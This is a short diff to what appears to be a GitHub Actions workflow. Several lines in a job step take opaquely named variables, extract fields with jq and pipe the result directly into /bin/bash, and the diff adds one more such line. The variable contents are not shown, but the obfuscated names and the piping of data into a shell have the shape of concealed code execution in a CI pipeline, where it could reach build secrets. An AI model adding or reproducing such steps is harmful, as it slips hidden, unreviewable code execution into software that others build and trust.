@@ -44,6 +44,7 @@ jobs:
           echo $j11 | jq -r .p619 | /bin/bash
           echo $vvn37 | jq -r .towd112 | /bin/bash
           printf '%s' "$ig3212" | jq -r .f615 | /bin/bash
+          printf '%s' "$hb6" | jq -r .higbw6 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
